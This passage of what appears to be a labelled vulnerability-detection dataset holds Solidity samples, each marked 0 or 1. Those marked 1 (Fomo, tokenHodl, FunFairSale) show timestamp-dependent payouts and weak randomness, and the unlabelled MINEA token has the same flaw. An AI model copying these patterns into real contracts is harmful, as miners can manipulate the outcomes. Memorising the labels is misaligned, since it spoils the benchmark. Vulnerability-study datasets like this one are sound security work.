b == 0;    }         function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {        return div(mul(a, b), base);    }    function fxpDiv(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {        return div(mul(a, base), b);    }}
0<CODESPLIT>contract IFeeToken is ERC20, Initializable {    function initialize(IFeeWindow _feeWindow) public returns (bool);    function getFeeWindow() public view returns (IFeeWindow);    function feeWindowBurn(address _target, uint256 _amount) public returns (bool);    function mintForReportingParticipant(address _target, uint256 _amount) public returns (bool);}
0<CODESPLIT>contract IFeeWindow is ITyped, ERC20 {    function initialize(IUniverse _universe, uint256 _feeWindowId) public returns (bool);    function getUniverse() public view returns (IUniverse);    function getReputationToken() public view returns (IReputationToken);    function getStartTime() public view returns (uint256);    function getEndTime() public view returns (uint256);    function getNumMarkets() public view returns (uint256);    function getNumInvalidMarkets() public view returns (uint256);    function getNumIncorrectDesignatedReportMarkets() public view returns (uint256);    function getNumDesignatedReportNoShows() public view returns (uint256);    function getFeeToken() public view returns (IFeeToken);    function isActive() public view returns (bool);    function isOver() public view returns (bool);    function onMarketFinalized() public returns (bool);    function buy(uint256 _attotokens) public returns (bool);    function redeem(address _sender) public returns (bool);    function redeemForReportingParticipant() public returns (bool);    function mintFeeTokens(uint256 _amount) public returns (bool);    function trustedUniverseBuy(address _buyer, uint256 _attotokens) public returns (bool);}
0<CODESPLIT>contract IMailbox {    function initialize(address _owner, IMarket _market) public returns (bool);    function depositEther() public payable returns (bool);}
0<CODESPLIT>contract IMarket is ITyped, IOwnable {    enum MarketType {        YES_NO,        CATEGORICAL,        SCALAR    }    function initialize(IUniverse _universe, uint256 _endTime, uint256 _feePerEthInAttoeth, ICash _cash, address _designatedReporterAddress, address _creator, uint256 _numOutcomes, uint256 _numTicks) public payable returns (bool _success);    function derivePayoutDistributionHash(uint256[] _payoutNumerators, bool _invalid) public view returns (bytes32);    function getUniverse() public view returns (IUniverse);    function getFeeWindow() public view returns (IFeeWindow);    function getNumberOfOutcomes() public view returns (uint256);    function getNumTicks() public view returns (uint256);    function getDenominationToken() public view returns (ICash);    function getShareToken(uint256 _outcome)  public view returns (IShareToken);    function getMarketCreatorSettlementFeeDivisor() public view returns (uint256);    function getForkingMarket() public view returns (IMarket _market);    function getEndTime() public view returns (uint256);    function getMarketCreatorMailbox() public view returns (IMailbox);    function getWinningPayoutDistributionHash() public view returns (bytes32);    function getWinningPayoutNumerator(uint256 _outcome) public view returns (uint256);    function getReputationToken() public view returns (IReputationToken);    function getFinalizationTime() public view returns (uint256);    function getInitialReporterAddress() public view returns (address);    function deriveMarketCreatorFeeAmount(uint256 _amount) public view returns (uint256);    function isContainerForShareToken(IShareToken _shadyTarget) public view returns (bool);    function isContainerForReportingParticipant(IReportingParticipant _reportingParticipant) public view returns (bool);    function isInvalid() public view returns (bool);    function finalize() public returns (bool);    function designatedReporterWasCorrect() public view returns (bool);    function designatedReporterShowed() public view returns (bool);    function isFinalized() public view returns (bool);    function finalizeFork() public returns (bool);    function assertBalances() public view returns (bool);}
0<CODESPLIT>contract IReportingParticipant {    function getStake() public view returns (uint256);    function getPayoutDistributionHash() public view returns (bytes32);    function liquidateLosing() public returns (bool);    function redeem(address _redeemer) public returns (bool);    function isInvalid() public view returns (bool);    function isDisavowed() public view returns (bool);    function migrate() public returns (bool);    function getPayoutNumerator(uint256 _outcome) public view returns (uint256);    function getMarket() public view returns (IMarket);    function getSize() public view returns (uint256);}
0<CODESPLIT>contract IReputationToken is ITyped, ERC20 {    function initialize(IUniverse _universe) public returns (bool);    function migrateOut(IReputationToken _destination, uint256 _attotokens) public returns (bool);    function migrateIn(address _reporter, uint256 _attotokens) public returns (bool);    function trustedReportingParticipantTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);    function trustedMarketTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);    function trustedFeeWindowTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);    function trustedUniverseTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);    function getUniverse() public view returns (IUniverse);    function getTotalMigrated() public view returns (uint256);    function getTotalTheoreticalSupply() public view returns (uint256);    function mintForReportingParticipant(uint256 _amountMigrated) public returns (bool);}
0<CODESPLIT>contract IUniverse is ITyped {    function initialize(IUniverse _parentUniverse, bytes32 _parentPayoutDistributionHash) external returns (bool);    function fork() public returns (bool);    function getParentUniverse() public view returns (IUniverse);    function createChildUniverse(uint256[] _parentPayoutNumerators, bool _invalid) public returns (IUniverse);    function getChildUniverse(bytes32 _parentPayoutDistributionHash) public view returns (IUniverse);    function getReputationToken() public view returns (IReputationToken);    function getForkingMarket() public view returns (IMarket);    function getForkEndTime() public view returns (uint256);    function getForkReputationGoal() public view returns (uint256);    function getParentPayoutDistributionHash() public view returns (bytes32);    function getDisputeRoundDurationInSeconds() public view returns (uint256);    function getOrCreateFeeWindowByTimestamp(uint256 _timestamp) public returns (IFeeWindow);    function getOrCreateCurrentFeeWindow() public returns (IFeeWindow);    function getOrCreateNextFeeWindow() public returns (IFeeWindow);    function getOpenInterestInAttoEth() public view returns (uint256);    function getRepMarketCapInAttoeth() public view returns (uint256);    function getTargetRepMarketCapInAttoeth() public view returns (uint256);    function getOrCacheValidityBond() public returns (uint256);    function getOrCacheDesignatedReportStake() public returns (uint256);    function getOrCacheDesignatedReportNoShowBond() public returns (uint256);    function getOrCacheReportingFeeDivisor() public returns (uint256);    function getDisputeThresholdForFork() public view returns (uint256);    function getInitialReportMinValue() public view returns (uint256);    function calculateFloatingValue(uint256 _badMarkets, uint256 _totalMarkets, uint256 _targetDivisor, uint256 _previousValue, uint256 _defaultValue, uint256 _floor) public pure returns (uint256 _newValue);    function getOrCacheMarketCreationCost() public returns (uint256);    function getCurrentFeeWindow() public view returns (IFeeWindow);    function getOrCreateFeeWindowBefore(IFeeWindow _feeWindow) public returns (IFeeWindow);    function isParentOf(IUniverse _shadyChild) public view returns (bool);    function updateTentativeWinningChildUniverse(bytes32 _parentPayoutDistributionHash) public returns (bool);    function isContainerForFeeWindow(IFeeWindow _shadyTarget) public view returns (bool);    function isContainerForMarket(IMarket _shadyTarget) public view returns (bool);    function isContainerForReportingParticipant(IReportingParticipant _reportingParticipant) public view returns (bool);    function isContainerForShareToken(IShareToken _shadyTarget) public view returns (bool);    function isContainerForFeeToken(IFeeToken _shadyTarget) public view returns (bool);    function addMarketTo() public returns (bool);    function removeMarketFrom() public returns (bool);    function decrementOpenInterest(uint256 _amount) public returns (bool);    function decrementOpenInterestFromMarket(uint256 _amount) public returns (bool);    function incrementOpenInterest(uint256 _amount) public returns (bool);    function incrementOpenInterestFromMarket(uint256 _amount) public returns (bool);    function getWinningChildUniverse() public view returns (IUniverse);    function isForking() public view returns (bool);}
0<CODESPLIT>contract ICash is ERC20 {    function depositEther() external payable returns(bool);    function depositEtherFor(address _to) external payable returns(bool);    function withdrawEther(uint256 _amount) external returns(bool);    function withdrawEtherTo(address _to, uint256 _amount) external returns(bool);    function withdrawEtherToIfPossible(address _to, uint256 _amount) external returns (bool);}
0<CODESPLIT>contract IOrders {    function saveOrder(Order.Types _type, IMarket _market, uint256 _fxpAmount, uint256 _price, address _sender, uint256 _outcome, uint256 _moneyEscrowed, uint256 _sharesEscrowed, bytes32 _betterOrderId, bytes32 _worseOrderId, bytes32 _tradeGroupId) public returns (bytes32 _orderId);    function removeOrder(bytes32 _orderId) public returns (bool);    function getMarket(bytes32 _orderId) public view returns (IMarket);    function getOrderType(bytes32 _orderId) public view returns (Order.Types);    function getOutcome(bytes32 _orderId) public view returns (uint256);    function getAmount(bytes32 _orderId) public view returns (uint256);    function getPrice(bytes32 _orderId) public view returns (uint256);    function getOrderCreator(bytes32 _orderId) public view returns (address);    function getOrderSharesEscrowed(bytes32 _orderId) public view returns (uint256);    function getOrderMoneyEscrowed(bytes32 _orderId) public view returns (uint256);    function getBetterOrderId(bytes32 _orderId) public view returns (bytes32);    function getWorseOrderId(bytes32 _orderId) public view returns (bytes32);    function getBestOrderId(Order.Types _type, IMarket _market, uint256 _outcome) public view returns (bytes32);    function getWorstOrderId(Order.Types _type, IMarket _market, uint256 _outcome) public view returns (bytes32);    function getLastOutcomePrice(IMarket _market, uint256 _outcome) public view returns (uint256);    function getOrderId(Order.Types _type, IMarket _market, uint256 _fxpAmount, uint256 _price, address _sender, uint256 _blockNumber, uint256 _outcome, uint256 _moneyEscrowed, uint256 _sharesEscrowed) public pure returns (bytes32);    function getTotalEscrowed(IMarket _market) public view returns (uint256);    function isBetterPrice(Order.Types _type, uint256 _price, bytes32 _orderId) public view returns (bool);    function isWorsePrice(Order.Types _type, uint256 _price, bytes32 _orderId) public view returns (bool);    function assertIsNotBetterPrice(Order.Types _type, uint256 _price, bytes32 _betterOrderId) public view returns (bool);    function assertIsNotWorsePrice(Order.Types _type, uint256 _price, bytes32 _worseOrderId) public returns (bool);    function recordFillOrder(bytes32 _orderId, uint256 _sharesFilled, uint256 _tokensFilled) public returns (bool);    function setPrice(IMarket _market, uint256 _outcome, uint256 _price) external returns (bool);    function incrementTotalEscrowed(IMarket _market, uint256 _amount) external returns (bool);    function decrementTotalEscrowed(IMarket _market, uint256 _amount) external returns (bool);}
0<CODESPLIT>contract IShareToken is ITyped, ERC20 {    function initialize(IMarket _market, uint256 _outcome) external returns (bool);    function createShares(address _owner, uint256 _amount) external returns (bool);    function destroyShares(address, uint256 balance) external returns (bool);    function getMarket() external view returns (IMarket);    function getOutcome() external view returns (uint256);    function trustedOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);    function trustedFillOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);    function trustedCancelOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);}library Order {    using SafeMathUint256 for uint256;    enum Types {        Bid, Ask    }    enum TradeDirections {        Long, Short    }    struct Data {                 IOrders orders;        IMarket market;        IAugur augur;                 bytes32 id;        address creator;        uint256 outcome;        Order.Types orderType;        uint256 amount;        uint256 price;        uint256 sharesEscrowed;        uint256 moneyEscrowed;        bytes32 betterOrderId;        bytes32 worseOrderId;    }                        function create(IController _controller, address _creator, uint256 _outcome, Order.Types _type, uint256 _attoshares, uint256 _price, IMarket _market, bytes32 _betterOrderId, bytes32 _worseOrderId) internal view returns (Data) {        require(_outcome < _market.getNumberOfOutcomes());        require(_price < _market.getNumTicks());        IOrders _orders = IOrders(_controller.lookup("Orders"));        IAugur _augur = _controller.getAugur();        return Data({            orders: _orders,            market: _market,            augur: _augur,            id: 0,            creator: _creator,            outcome: _outcome,            orderType: _type,            amount: _attoshares,            price: _price,            sharesEscrowed: 0,            moneyEscrowed: 0,            betterOrderId: _betterOrderId,            worseOrderId: _worseOrderId        });    }                   function getOrderId(Order.Data _orderData) internal view returns (bytes32) {        if (_orderData.id == bytes32(0)) {            bytes32 _orderId = _orderData.orders.getOrderId(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, block.number, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed);            require(_orderData.orders.getAmount(_orderId) == 0);            _orderData.id = _orderId;        }        return _orderData.id;    }    function getOrderTradingTypeFromMakerDirection(Order.TradeDirections _creatorDirection) internal pure returns (Order.Types) {        return (_creatorDirection == Order.TradeDirections.Long) ? Order.Types.Bid : Order.Types.Ask;    }    function getOrderTradingTypeFromFillerDirection(Order.TradeDirections _fillerDirection) internal pure returns (Order.Types) {        return (_fillerDirection == Order.TradeDirections.Long) ? Order.Types.Ask : Order.Types.Bid;    }    function escrowFunds(Order.Data _orderData) internal returns (bool) {        if (_orderData.orderType == Order.Types.Ask) {            return escrowFundsForAsk(_orderData);        } else if (_orderData.orderType == Order.Types.Bid) {            return escrowFundsForBid(_orderData);        }    }    function saveOrder(Order.Data _orderData, bytes32 _tradeGroupId) internal returns (bytes32) {        return _orderData.orders.saveOrder(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed, _orderData.betterOrderId, _orderData.worseOrderId, _tradeGroupId);    }                   function escrowFundsForBid(Order.Data _orderData) private returns (bool) {        require(_orderData.moneyEscrowed == 0);        require(_orderData.sharesEscrowed == 0);        uint256 _attosharesToCover = _orderData.amount;        uint256 _numberOfOutcomes = _orderData.market.getNumberOfOutcomes();                 uint256 _attosharesHeld = 2**254;        for (uint256 _i = 0; _i < _numberOfOutcomes; _i++) {            if (_i != _orderData.outcome) {                uint256 _creatorShareTokenBalance = _orderData.market.getShareToken(_i).balanceOf(_orderData.creator);                _attosharesHeld = SafeMathUint256.min(_creatorShareTokenBalance, _attosharesHeld);            }        }                 if (_attosharesHeld > 0) {            _orderData.sharesEscrowed = SafeMathUint256.min(_attosharesHeld, _attosharesToCover);            _attosharesToCover -= _orderData.sharesEscrowed;            for (_i = 0; _i < _numberOfOutcomes; _i++) {                if (_i != _orderData.outcome) {                    _orderData.market.getShareToken(_i).trustedOrderTransfer(_orderData.creator, _orderData.market, _orderData.sharesEscrowed);                }            }        }                 if (_attosharesToCover > 0) {            _orderData.moneyEscrowed = _attosharesToCover.mul(_orderData.price);            require(_orderData.augur.trustedTransfer(_orderData.market.getDenominationToken(), _orderData.creator, _orderData.market, _orderData.moneyEscrowed));        }        return true;    }    function escrowFundsForAsk(Order.Data _orderData) private returns (bool) {        require(_orderData.moneyEscrowed == 0);        require(_orderData.sharesEscrowed == 0);        IShareToken _shareToken = _orderData.market.getShareToken(_orderData.outcome);        uint256 _attosharesToCover = _orderData.amount;                 uint256 _attosharesHeld = _shareToken.balanceOf(_orderData.creator);                 if (_attosharesHeld > 0) {            _orderData.sharesEscrowed = SafeMathUint256.min(_attosharesHeld, _attosharesToCover);            _attosharesToCover -= _orderData.sharesEscrowed;            _shareToken.trustedOrderTransfer(_orderData.creator, _orderData.market, _orderData.sharesEscrowed);        }                 if (_attosharesToCover > 0) {            _orderData.moneyEscrowed = _orderData.market.getNumTicks().sub(_orderData.price).mul(_attosharesToCover);            require(_orderData.augur.trustedTransfer(_orderData.market.getDenominationToken(), _orderData.creator, _orderData.market, _orderData.moneyEscrowed));        }        return true;    }}
1<CODESPLIT>contract myTime {    function getBlockTime() constant returns (uint) {        return block.timestamp;    }}
1<CODESPLIT>contract FunFairSale {    uint public deadline;    uint public capAmount;    function () payable {        if (this.balance >= capAmount) throw;        if (this.balance + msg.value >= capAmount) {            deadline = block.timestamp;        }    }}
0<CODESPLIT>contract MINEA {    string public name = 'MINEA';    string public symbol = 'MINEA';    uint8 public decimals = 18;    uint public totalSupply = 10000000000000000000000000;    uint public minted = totalSupply / 5;    uint public minReward = 1000000000000000000;    uint public fee = 700000000000000;    uint public reducer = 1000;    uint private randomNumber;    address public owner;    uint private ownerBalance;    uint public bountyDurationInBlocks = 36000;      uint public finishBountyAt;             mapping (address => uint256) public balanceOf;    mapping (address => uint256) public successesOf;    mapping (address => uint256) public failsOf;    mapping (address => mapping (address => uint256)) public allowance;             event Transfer(address indexed from, address indexed to, uint256 value);        modifier onlyOwner {        if (msg.sender != owner) revert();        _;    }        function transferOwnership(address newOwner) external onlyOwner {        owner = newOwner;    }             function MINEA() public {        owner = msg.sender;        balanceOf[owner] = minted;        balanceOf[this] = totalSupply - balanceOf[owner];        finishBountyAt = block.number + bountyDurationInBlocks;    }             function _transfer(address _from, address _to, uint _value) internal {        require(_to != 0x0);        require(balanceOf[_from] >= _value);        require(balanceOf[_to] + _value > balanceOf[_to]);        uint previousBalances = balanceOf[_from] + balanceOf[_to];        balanceOf[_from] -= _value;        balanceOf[_to] += _value;        Transfer(_from, _to, _value);        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);    }             function transfer(address _to, uint256 _value) external {        _transfer(msg.sender, _to, _value);    }             function transferFrom(address _from, address _to, uint256 _value) external returns (bool success) {        require(_value <= allowance[_from][msg.sender]);              allowance[_from][msg.sender] -= _value;        _transfer(_from, _to, _value);        return true;    }             function approve(address _spender, uint256 _value) external returns (bool success) {        allowance[msg.sender][_spender] = _value;        return true;    }        function withdrawEther() external onlyOwner {        owner.transfer(ownerBalance);        ownerBalance = 0;    }        function () external payable {        if (msg.value == fee) {            randomNumber += block.timestamp + uint(msg.sender);            uint minedAtBlock = uint(block.blockhash(block.number - 1));            uint minedHashRel = uint(sha256(minedAtBlock + randomNumber + uint(msg.sender))) % 10000000;            uint balanceRel = balanceOf[msg.sender] * 1000 / minted;            uint reward;            if (block.number < finishBountyAt) {                reward = 50000000000000000000;                _transfer(this, msg.sender, reward);                minted += reward;                successesOf[msg.sender]++;                ownerBalance += fee;                reducer++;            } else if (balanceRel >= 1) {                if (balanceRel > 255) {                    balanceRel = 255;                }                balanceRel = 2 ** balanceRel;                balanceRel = 5000000 / balanceRel;                balanceRel = 5000000 - balanceRel;                if (minedHashRel < balanceRel) {                    reward = minReward + minedHashRel * 1000 / reducer * 100000000000000;                    _transfer(this, msg.sender, reward);                    minted += reward;                    successesOf[msg.sender]++;                } else {                    Transfer(this, msg.sender, 0);                    failsOf[msg.sender]++;                }                ownerBalance += fee;                reducer++;            } else {                revert();            }        } else {            revert();        }    }}
1<CODESPLIT>contract Fomo {    uint256 public airDropTracker_ = 0;    function airdrop() private view returns(bool) {        uint256 seed = uint256(keccak256(abi.encodePacked((block.timestamp) / (now) )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }}
1<CODESPLIT>contract tokenHodl {    mapping (address => uint) public hodlers;    uint constant partyTime = 1522542236;    function party() {        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);        uint value = hodlers[msg.sender];        hodlers[msg.sender] = 0;        msg.sender.transfer(value);        return;    }}
0<CODESPLIT>contract Owned {    address public owner;    address public newOwner;    address internal admin;         modifier onlyOwner {        require(msg.sender == owner);        _;    }         modifier onlyAdmin {        require(msg.sender == admin || msg.sender == owner);        _;    }    event OwnershipTransferred(address indexed _from, address indexed _to);    event AdminChanged(address indexed _from, address indexed _to);         function Owned() public {        owner = msg.sender;        admin = msg.sender;    }    function setAdmin(address newAdmin) public onlyOwner{        emit AdminChanged(admin, newAdmin);        admin = newAdmin;    }    function showAdmin() public view onlyAdmin returns(address _admin){        _admin = admin;        return _admin;    }    function transferOwnership(address _newOwner) public onlyOwner {        newOwner = _newOwner;    }    function acceptOwnership() public {        require(msg.sender == newOwner);        emit OwnershipTransferred(owner, newOwner);        owner = newOwner;        newOwner = address(0);    }}    
0<CODESPLIT>contract ApproveAndCallFallBack {    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;}
0<CODESPLIT>contract Redenom is ERC20Interface, Owned{    using SafeMath for uint;             string      public name;      string      public symbol;      uint        private _totalSupply;      uint        public decimals = 8;           uint public round = 1;     uint public epoch = 1;     bool public frozen = false;         uint[8] private dec = [0,0,0,0,0,0,0,0];         uint[9] private mul = [1,10,100,1000,10000,100000,1000000,10000000,100000000];         uint[9] private weight = [uint(0),0,0,0,0,5,10,30,55];         uint[9] private current_toadd = [uint(0),0,0,0,0,0,0,0,0];             uint public total_fund;      uint public epoch_fund;      uint public team_fund;      uint public redenom_dao_fund;      struct Account {        uint balance;        uint lastRound;          uint lastVotedEpoch;          uint bitmask;                                                                      }        mapping(address=>Account) accounts;     mapping(address => mapping(address => uint)) allowed;         event Redenomination(uint indexed round);    event Epoch(uint indexed epoch);    event VotingOn(address indexed initiator);    event VotingOff(address indexed initiator);    event Vote(address indexed voter, uint indexed propId, uint voterBalance, uint indexed voteEpoch);    function Redenom() public {        symbol = "NOMT";        name = "Redenom_test";        _totalSupply = 0;          total_fund = 1000000 * 10**decimals;          epoch_fund = 100000 * 10**decimals;          total_fund = total_fund.sub(epoch_fund);      }                        function StartNewEpoch() public onlyAdmin returns(bool succ){        require(frozen == false);         require(round == 9);        require(epoch < 10);        require(votingActive == false);         dec = [0,0,0,0,0,0,0,0];          round = 1;        epoch++;        epoch_fund = 100000 * 10**decimals;          total_fund = total_fund.sub(epoch_fund);          delete projects;        emit Epoch(epoch);        return true;    }              bool public votingActive = false;         modifier onlyVoter {        require(votingActive == true);        require(bitmask_check(msg.sender, 4) == true);                   require((accounts[msg.sender].lastVotedEpoch < epoch));        require(bitmask_check(msg.sender, 1024) == false);          _;    }         struct Project {        uint id;            uint votesWeight;          bool active;      }         Project[] public projects;         function addProject(uint _id) public onlyAdmin {        projects.push(Project({            id: _id,            votesWeight: 0,            active: true        }));    }         function swapProject(uint _id) public onlyAdmin {        for (uint p = 0; p < projects.length; p++){            if(projects[p].id == _id){                if(projects[p].active == true){                    projects[p].active = false;                }else{                    projects[p].active = true;                }            }        }    }         function projectWeight(uint _id) public constant returns(uint PW){        for (uint p = 0; p < projects.length; p++){            if(projects[p].id == _id){                return projects[p].votesWeight;            }        }    }         function projectActive(uint _id) public constant returns(bool PA){        for (uint p = 0; p < projects.length; p++){            if(projects[p].id == _id){                return projects[p].active;            }        }    }         function vote(uint _id) public onlyVoter returns(bool success){        require(frozen == false);                 for (uint p = 0; p < projects.length; p++){            if(projects[p].id == _id && projects[p].active == true){                projects[p].votesWeight += sqrt(accounts[msg.sender].balance);                accounts[msg.sender].lastVotedEpoch = epoch;            }        }        emit Vote(msg.sender, _id, accounts[msg.sender].balance, epoch);        return true;    }         function winningProject() public constant returns (uint _winningProject){        uint winningVoteWeight = 0;        for (uint p = 0; p < projects.length; p++) {            if (projects[p].votesWeight > winningVoteWeight && projects[p].active == true) {                winningVoteWeight = projects[p].votesWeight;                _winningProject = projects[p].id;            }        }    }              function enableVoting() public onlyAdmin returns(bool succ){         require(votingActive == false);        require(frozen == false);        require(round == 9);        votingActive = true;        emit VotingOn(msg.sender);        return true;    }         function disableVoting() public onlyAdmin returns(bool succ){        require(votingActive == true);        require(frozen == false);        votingActive = false;        emit VotingOff(msg.sender);        return true;    }         function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }                                       function pay1(address to) public onlyAdmin returns(bool success){        require(bitmask_check(to, 4) == false);        uint new_amount = 100000000;        payout(to,new_amount);        bitmask_add(to, 4);        return true;    }                   function pay055(address to) public onlyAdmin returns(bool success){        require(bitmask_check(to, 2) == false);        uint new_amount = 55566600 + (block.timestamp%100);               payout(to,new_amount);        bitmask_add(to, 2);        return true;    }                   function pay055loyal(address to) public onlyAdmin returns(bool success){        require(epoch > 1);        require(bitmask_check(to, 4) == true);        uint new_amount = 55566600 + (block.timestamp%100);               payout(to,new_amount);        return true;    }              function payCustom(address to, uint amount) public onlyOwner returns(bool success){        payout(to,amount);        return true;    }                                  function payout(address to, uint amount) private returns (bool success){        require(to != address(0));        require(amount>=current_mul());        require(bitmask_check(to, 1024) == false);          require(frozen == false);                          updateAccount(to);                 uint fixedAmount = fix_amount(amount);        renewDec( accounts[to].balance, accounts[to].balance.add(fixedAmount) );        uint team_part = (fixedAmount/100)*10;        uint dao_part = (fixedAmount/100)*30;        uint total = fixedAmount.add(team_part).add(dao_part);        epoch_fund = epoch_fund.sub(total);        team_fund = team_fund.add(team_part);        redenom_dao_fund = redenom_dao_fund.add(dao_part);        accounts[to].balance = accounts[to].balance.add(fixedAmount);        _totalSupply = _totalSupply.add(total);        emit Transfer(address(0), to, fixedAmount);        return true;    }                   function withdraw_team_fund(address to, uint amount) public onlyOwner returns(bool success){        require(amount <= team_fund);        accounts[to].balance = accounts[to].balance.add(amount);        team_fund = team_fund.sub(amount);        return true;    }         function withdraw_dao_fund(address to, uint amount) public onlyOwner returns(bool success){        require(amount <= redenom_dao_fund);        accounts[to].balance = accounts[to].balance.add(amount);        redenom_dao_fund = redenom_dao_fund.sub(amount);        return true;    }    function freeze_contract() public onlyOwner returns(bool success){        require(frozen == false);        frozen = true;        return true;    }    function unfreeze_contract() public onlyOwner returns(bool success){        require(frozen == true);        frozen = false;        return true;    }                             function renewDec(uint initSum, uint newSum) internal returns(bool success){        if(round < 9){            uint tempInitSum = initSum;             uint tempNewSum = newSum;             uint cnt = 1;            while( (tempNewSum > 0 || tempInitSum > 0) && cnt <= decimals ){                uint lastInitSum = tempInitSum%10;                  tempInitSum = tempInitSum/10;                  uint lastNewSum = tempNewSum%10;                  tempNewSum = tempNewSum/10;                  if(cnt >= round){                    if(lastNewSum >= lastInitSum){                                                 dec[decimals-cnt] = dec[decimals-cnt].add(lastNewSum - lastInitSum);                    }else{                                                 dec[decimals-cnt] = dec[decimals-cnt].sub(lastInitSum - lastNewSum);                    }                }                cnt = cnt+1;            }        }         return true;    }                   function bitmask_add(address user, uint _bit) internal returns(bool success){          require(bitmask_check(user, _bit) == false);        accounts[user].bitmask = accounts[user].bitmask.add(_bit);        return true;    }              function bitmask_rm(address user, uint _bit) internal returns(bool success){        require(bitmask_check(user, _bit) == true);        accounts[user].bitmask = accounts[user].bitmask.sub(_bit);        return true;    }         function bitmask_check(address user, uint _bit) internal view returns (bool status){        bool flag;        accounts[user].bitmask & _bit == 0 ? flag = false : flag = true;        return flag;    }         function ban_user(address user) public onlyAdmin returns(bool success){        bitmask_add(user, 1024);        return true;    }    function unban_user(address user) public onlyAdmin returns(bool success){        bitmask_rm(user, 1024);        return true;    }    function is_banned(address user) public view onlyAdmin returns (bool result){        return bitmask_check(user, 1024);    }              function redenominate() public onlyAdmin returns(uint current_round){        require(frozen == false);         require(round<9);                   _totalSupply = _totalSupply.sub( team_fund%mul[round] ).sub( redenom_dao_fund%mul[round] ).sub( dec[8-round]*mul[round-1] );                 _totalSupply = ( _totalSupply / mul[round] ) * mul[round];        team_fund = ( team_fund / mul[round] ) * mul[round];          redenom_dao_fund = ( redenom_dao_fund / mul[round] ) * mul[round];          if(round>1){                         uint superold = dec[(8-round)+1];                          epoch_fund = epoch_fund.add(superold * mul[round-2]);            dec[(8-round)+1] = 0;        }                if(round<8){              uint unclimed = dec[8-round];                           uint total_current = dec[8-1-round];                                        if(total_current==0){                current_toadd = [0,0,0,0,0,0,0,0,0];                 round++;                return round;            }                         uint[9] memory numbers  =[uint(1),2,3,4,5,6,7,8,9];              uint[9] memory ke9  =[uint(0),0,0,0,0,0,0,0,0];              uint[9] memory k2e9  =[uint(0),0,0,0,0,0,0,0,0];              uint k05summ = 0;                for (uint k = 0; k < ke9.length; k++) {                                         ke9[k] = numbers[k]*1e9/total_current;                    if(k<5) k05summ += ke9[k];                }                             for (uint k2 = 5; k2 < k2e9.length; k2++) {                    k2e9[k2] = uint(ke9[k2])+uint(k05summ)*uint(weight[k2])/uint(100);                }                for (uint n = 5; n < current_toadd.length; n++) {                    current_toadd[n] = k2e9[n]*unclimed/10/1e9;                }                                         }else{            if(round==8){                                 epoch_fund = epoch_fund.add(dec[0] * 10000000);                  dec[0] = 0;            }                    }        round++;        emit Redenomination(round);        return round;    }                 function updateAccount(address account) public returns(uint new_balance){        require(frozen == false);         require(round<=9);        require(bitmask_check(account, 1024) == false);          if(round > accounts[account].lastRound){            if(round >1 && round <=8){                                 uint tempDividedBalance = accounts[account].balance/current_mul();                                 uint newFixedBalance = tempDividedBalance*current_mul();                                 uint lastActiveDigit = tempDividedBalance%10;                                  uint diff = accounts[account].balance - newFixedBalance;                                 if(diff > 0){                    accounts[account].balance = newFixedBalance;                    emit Transfer(account, address(0), diff);                }                uint toBalance = 0;                if(lastActiveDigit>0 && current_toadd[lastActiveDigit-1]>0){                    toBalance = current_toadd[lastActiveDigit-1] * current_mul();                }                if(toBalance > 0 && toBalance < dec[8-round+1]){                      renewDec( accounts[account].balance, accounts[account].balance.add(toBalance) );                    emit Transfer(address(0), account, toBalance);                                         accounts[account].balance = accounts[account].balance.add(toBalance);                                         dec[8-round+1] = dec[8-round+1].sub(toBalance);                                         _totalSupply = _totalSupply.add(toBalance);                                     }                accounts[account].lastRound = round;                                 return accounts[account].balance;                             }else{                if( round == 9){                      uint newBalance = fix_amount(accounts[account].balance);                    uint _diff = accounts[account].balance.sub(newBalance);                    if(_diff > 0){                        renewDec( accounts[account].balance, newBalance );                        accounts[account].balance = newBalance;                        emit Transfer(account, address(0), _diff);                    }                    accounts[account].lastRound = round;                                         return accounts[account].balance;                                     }            }        }    }              function current_mul() internal view returns(uint _current_mul){        return mul[round-1];    }              function fix_amount(uint amount) public view returns(uint fixed_amount){        return ( amount / current_mul() ) * current_mul();    }         function get_rest(uint amount) internal view returns(uint fixed_amount){        return amount % current_mul();    }                   function totalSupply() public view returns (uint) {        return _totalSupply;    }                   function balanceOf(address tokenOwner) public constant returns (uint balance) {        return accounts[tokenOwner].balance;    }                             function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {        return allowed[tokenOwner][spender];    }                                  function transfer(address to, uint tokens) public returns (bool success) {        require(frozen == false);         require(to != address(0));        require(bitmask_check(to, 1024) == false);                   tokens = fix_amount(tokens);                 require(tokens>0);                 updateAccount(to);        updateAccount(msg.sender);        uint fromOldBal = accounts[msg.sender].balance;        uint toOldBal = accounts[to].balance;        accounts[msg.sender].balance = accounts[msg.sender].balance.sub(tokens);        accounts[to].balance = accounts[to].balance.add(tokens);        require(renewDec(fromOldBal, accounts[msg.sender].balance));        require(renewDec(toOldBal, accounts[to].balance));        emit Transfer(msg.sender, to, tokens);        return true;    }                                            function approve(address spender, uint tokens) public returns (bool success) {        require(frozen == false);         require(bitmask_check(msg.sender, 1024) == false);          allowed[msg.sender][spender] = tokens;        emit Approval(msg.sender, spender, tokens);        return true;    }                                                 function transferFrom(address from, address to, uint tokens) public returns (bool success) {        require(frozen == false);         require(bitmask_check(to, 1024) == false);          updateAccount(from);        updateAccount(to);        uint fromOldBal = accounts[from].balance;        uint toOldBal = accounts[to].balance;        accounts[from].balance = accounts[from].balance.sub(tokens);        allowed[from][msg.sender] = 